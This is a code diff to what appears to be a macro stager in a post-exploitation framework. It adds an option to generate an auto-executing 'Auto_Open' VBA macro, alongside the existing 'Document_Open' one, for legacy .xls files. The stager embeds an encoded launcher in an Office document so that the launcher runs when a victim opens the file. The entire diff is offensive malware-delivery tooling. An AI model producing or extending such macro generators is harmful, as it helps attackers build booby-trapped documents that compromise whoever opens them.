@@ -44,6 +44,11 @@ class Stager:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
+            },
+            'LegacyMacro' : {
+                'Description'   :   'Generate macro compatible with office 97-2003 documents so a ".xls" extension can be used (True or False).',
+                'Required'      :   True,
+                'Value'         :   'False'
             }
         }
 
@@ -65,6 +70,7 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        legacyMacro = self.options['LegacyMacro']['Value']
 
         # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
@@ -79,7 +85,10 @@ class Stager:
             for chunk in chunks[1:]:
                 payload += "\tstr = str + \"" + str(chunk) + "\"\n"
 
-            macro = "Sub Document_Open()\n"
+            if legacyMacro == 'True':
+                macro = "Sub Auto_Open()\n"
+            else:
+            	macro = "Sub Document_Open()\n"
             macro += "\tDebugging\n"
             macro += "End Sub\n\n"
 
